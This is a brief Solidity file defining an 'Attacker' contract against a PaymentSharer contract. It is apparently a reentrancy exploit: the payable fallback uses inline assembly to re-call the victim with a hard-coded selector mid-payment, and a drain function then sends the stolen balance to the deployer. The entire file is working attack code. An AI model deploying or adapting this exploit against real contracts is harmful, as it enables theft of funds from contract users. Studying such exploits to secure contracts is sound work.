pragma solidity ^0.5.0;

import "./PaymentSharer.sol";

contract Attacker {
  address private victim;
  address payable owner;

  constructor() public {
    owner = msg.sender;
  }

  function attack(address a) external {
    victim = a;
    PaymentSharer x = PaymentSharer(a);
    x.updateSplit(0, 100);
    x.splitFunds(0);
  }

  function () payable external {
    address x = victim;
    assembly{
        mstore(0x80, 0xc3b18fb600000000000000000000000000000000000000000000000000000000)
        pop(call(10000, x, 0, 0x80, 0x44, 0, 0))
    }    
  }

  function drain() external {
    owner.transfer(address(this).balance);
  }
}
